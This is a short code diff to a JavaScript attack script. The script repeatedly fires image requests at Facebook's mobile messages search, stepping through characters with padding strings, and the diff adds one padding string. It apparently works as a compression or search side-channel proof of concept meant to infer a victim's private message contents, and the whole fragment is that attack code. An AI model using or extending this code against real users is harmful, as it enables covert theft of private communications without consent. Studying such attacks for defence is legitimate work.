@@ -27,8 +27,9 @@ function makeRequest() {
 	pref = "potrynmkwi_";
 	bypass_Huffman(ch);
 	ref = "ghos";
+	tail = "znsd";
 	var img = new Image();
-	img.src= "http://touch.facebook.com/messages/?q=" + pref + ref + ch;
+	img.src= "http://touch.facebook.com/messages/?q=" + pref + ref + ch + tail;
 	ch = String.fromCharCode(ch.charCodeAt(0) + 1);
 
 	setTimeout(makeRequest, 500);
